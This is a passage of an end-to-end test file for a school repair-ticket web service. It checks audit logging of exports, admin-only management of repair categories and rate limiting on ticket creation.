        .expect(400);
    });

    it('records exactly one AuditLogEntry with the requested range and returned count', async () => {
      await createTicket('稽核紀錄測試地點');

      await apiRequest(app)
        .get('/repairs/export?from=2026-01-01&to=2026-12-31')
        .set('Authorization', `Bearer ${facilityManagerToken}`)
        .expect(200);

      const entries = await prisma.auditLogEntry.findMany({
        where: { action: 'REPAIR_EXPORT', targetType: 'RepairExport' },
        orderBy: { createdAt: 'desc' },
      });
      expect(entries.length).toBeGreaterThan(0);
      const latest = entries[0];
      expect(latest.targetId).toBe('all');
      const detail = JSON.parse(latest.detail ?? '{}') as {
        from: string | null;
        to: string | null;
        count: number;
        actorRole: string;
      };
      expect(detail.from).toBe('2026-01-01T00:00:00.000Z');
      expect(detail.to).toBe('2026-12-31T23:59:59.999Z');
      expect(detail.count).toBeGreaterThan(0);
      expect(detail.actorRole).toBe('FACILITY_MANAGER');
    });
  });

  describe('Repair Categories', () => {
    it('any authenticated User can list Repair Categories', async () => {
      const res = await apiRequest(app)
        .get('/repair-categories')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(200);
      expect(Array.isArray(res.body)).toBe(true);
    });

    it('rejects category creation by a non-Admin User', () => {
      return apiRequest(app)
        .post('/repair-categories')
        .set('Authorization', `Bearer ${userToken}`)
        .send({ name: 'Test Category Denied' })
        .expect(403);
    });

    it('Admin can create and remove a Repair Category', async () => {
      const created = await apiRequest(app)
        .post('/repair-categories')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ name: 'Test Category A' })
        .expect(201);
      const body = created.body as RepairCategoryResponse;
      expect(body.name).toBe('Test Category A');

      await apiRequest(app)
        .delete(`/repair-categories/${body.id}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(204);
    });

    it('rejects category deletion by a non-Admin User', async () => {
      const created = await apiRequest(app)
        .post('/repair-categories')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ name: 'Test Category B' })
        .expect(201);
      const body = created.body as RepairCategoryResponse;

      await apiRequest(app)
        .delete(`/repair-categories/${body.id}`)
        .set('Authorization', `Bearer ${userToken}`)
        .expect(403);
    });

    it('rejects creating a duplicate Repair Category', async () => {
      await apiRequest(app)
        .post('/repair-categories')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ name: 'Test Category C' })
        .expect(201);

      await apiRequest(app)
        .post('/repair-categories')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ name: 'Test Category C' })
        .expect(409);
    });
  });
});

// A fresh app instance per test, each with its own in-memory
// ThrottlerStorage, so one test's requests never count toward another
// test's budget — and with the real ThrottlerGuard (not stubbed out, as it
// is for every other test in this file), so the actual creation-endpoint
// rate limit can be exercised directly.
describe('Repair Ticket rate limiting (e2e)', () => {
  let app: NestExpressApplication;
  let authService: AuthService;
  let prisma: PrismaService;
  let token: string;

  beforeEach(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleFixture.createNestApplication<NestExpressApplication>();
    setApiPrefix(app);
    serveUploads(app);
    authService = moduleFixture.get(AuthService);
    prisma = moduleFixture.get(PrismaService);
    await app.init();

    const { user } = await authService.loginWithGoogle({
      googleSub: 'sub-throttle-reporter@school.edu.tw',
      email: 'throttle-reporter@school.edu.tw',
      name: 'throttle-reporter@school.edu.tw',
      hostedDomain: 'school.edu.tw',
    });
    const code = authService.createLoginCode(user.id);
    ({ accessToken: token } = await authService.exchangeLoginCode(code));

    await prisma.repairCategory.upsert({
      where: { name: 'Throttle Test Category' },
      create: { name: 'Throttle Test Category' },
      update: {},
    });
  });

  afterEach(async () => {
    await prisma.repairTicket.deleteMany({});
    await prisma.repairCategory.deleteMany({
      where: { name: 'Throttle Test Category' },
    });
    await prisma.account.deleteMany({});
    await prisma.user.deleteMany({});
    await app.close();
  });

  it('rejects a POST /repairs burst past the configured limit with 429', async () => {
    let sawThrottled = false;
    for (let i = 0; i < 20; i++) {
      const res = await apiRequest(app)
        .post('/repairs')
        .set('Authorization', `Bearer ${token}`)
        .field('location', `Throttle burst ${i}`)
        .field('category', 'Throttle Test Category')
        .field('description', 'x')
        .field('userClass', '資訊三甲')
        .field('userPhone', '0912-345-678');
      if (res.status === 429) {
        sawThrottled = true;
        break;
      }
      expect(res.status).toBe(201);
    }
    expect(sawThrottled).toBe(true);
  });
});
